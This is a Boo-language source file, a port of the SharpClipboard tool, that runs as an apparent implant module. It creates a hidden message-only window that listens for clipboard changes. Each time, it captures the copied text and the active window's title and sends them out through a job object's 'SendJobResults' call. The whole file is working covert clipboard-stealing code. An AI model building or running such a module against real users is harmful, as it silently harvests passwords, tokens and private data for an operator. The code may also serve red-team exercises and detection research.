/*

Boolang port of SharpClipboard (https://github.com/justinbui/SharpClipboard)

*/

import System
import System.Windows.Forms
import System.Runtime.InteropServices
import System.Text
import System.Threading

//https://stackoverflow.com/questions/17762037/error-while-trying-to-copy-string-to-clipboard
//https://gist.github.com/glombard/7986317

internal static class NativeMethods:
    //Reference https://docs.microsoft.com/en-us/windows/desktop/dataxchg/wm-clipboardupdate
    public WM_CLIPBOARDUPDATE as int = 0x031D
    //Reference https://www.pinvoke.net/default.aspx/Constants.HWND
    public static HWND_MESSAGE as IntPtr = IntPtr(-3)

    //Reference https://www.pinvoke.net/default.aspx/user32/AddClipboardFormatListener.html
    [DllImport("user32.dll", SetLastError: true)]
    public static def AddClipboardFormatListener(hwnd as IntPtr) as bool:
        pass

    //Reference https://www.pinvoke.net/default.aspx/user32.setparent
    [DllImport("user32.dll", SetLastError: true)]
    public static def SetParent(hWndChild as IntPtr, hWndNewParent as IntPtr) as IntPtr:
        pass

    //Reference https://www.pinvoke.net/default.aspx/user32/getwindowtext.html
    [DllImport("user32.dll", CharSet: CharSet.Unicode, SetLastError: true)]
    public static def GetWindowText(hWnd as IntPtr, lpString as StringBuilder, nMaxCount as int) as int:
        pass

    //Reference https://www.pinvoke.net/default.aspx/user32.getwindowtextlength
    [DllImport("user32.dll")]
    public static def GetWindowTextLength(hWnd as IntPtr) as int:
        pass

    //Reference https://www.pinvoke.net/default.aspx/user32.getforegroundwindow
    [DllImport("user32.dll")]
    public static def GetForegroundWindow() as IntPtr:
        pass

public static class Clipboard:
    public static def GetText() as string:
        ReturnValue as string = string.Empty
        STAThread as Thread = Thread() do:
            ReturnValue = System.Windows.Forms.Clipboard.GetText()

        STAThread.SetApartmentState(ApartmentState.STA)
        STAThread.Start()
        STAThread.Join()

        return ReturnValue

public class Test:
    public def MyFunc(output as string):
        print output

public class NotificationForm(Form):
    private _job as duck

    public def constructor(job as duck):
        _job = job
        //Turn the child window into a message-only window (refer to Microsoft docs)
        NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE)
        //Place window in the system-maintained clipboard format listener list
        NativeMethods.AddClipboardFormatListener(Handle)
        #print "Started Clipboard monitor!"

    protected override def WndProc(ref m as Message):
        //Listen for operating system messages

        if m.Msg == NativeMethods.WM_CLIPBOARDUPDATE:
            //Write to stdout active window
            active_window as IntPtr = NativeMethods.GetForegroundWindow()
            length as int = NativeMethods.GetWindowTextLength(active_window)
            sb as StringBuilder = StringBuilder(length + 1)
            NativeMethods.GetWindowText(active_window, sb, sb.Capacity)

            using output = StringBuilder("=== $(sb.ToString()) ===\r\n"):
                output.Append(Clipboard.GetText())
                #print output.ToString()
                _job.SendJobResults(output.ToString())

        //Called for any unhandled messages
        super(m)

public static def Start(job as duck):
    Application.Run(NotificationForm(job))
